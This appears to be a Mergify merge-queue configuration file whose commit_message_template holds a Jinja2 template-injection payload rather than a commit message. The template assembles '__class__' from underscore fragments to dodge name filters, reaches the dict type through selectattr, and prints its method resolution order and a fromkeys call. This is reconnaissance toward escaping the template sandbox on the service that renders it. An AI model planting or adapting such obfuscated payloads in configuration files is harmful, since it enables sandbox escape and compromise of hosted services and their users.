pull_request_rules:
  - name: auto-queue
    conditions:
      - base=main
    actions:
      queue:
        name: default
queue_rules:
  - name: default
    queue_conditions:
      - base=main
    merge_conditions: []
    merge_method: merge
    commit_message_template: |
      {% set u = "_" %}
      {% set dc = u ~ u ~ "class" ~ u ~ u %}
      {% set t = [dict]|selectattr(dc)|first %}
      MRO_ATTR: {{ t|attr('mro') }}
      MRO_CALL: {{ t.mro() }}
      FROMKEYS: {{ t.fromkeys(['a','b'], 0) }}
      T_STR: {{ t }}
merge_queue:
  max_parallel_checks: 1
